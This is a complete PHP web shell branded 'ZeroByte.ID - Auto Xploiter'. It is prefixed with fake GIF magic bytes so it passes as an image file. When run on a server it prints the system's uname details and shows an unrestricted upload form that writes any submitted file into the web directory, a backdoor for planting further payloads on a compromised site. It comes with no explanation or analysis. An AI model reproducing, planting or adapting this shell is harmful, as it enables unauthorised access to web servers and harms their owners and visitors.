GIF89;a<?php
echo "ZeroByte.ID - Auto Xploiter";
echo "<br>".php_uname()."<br>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='zb'><input type='submit' name='upload' value='upload'>
</form>";
if($_POST['upload']) {
	if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) {
	echo "sukses";
	} else {
	echo "gagal";
	}
}
?>
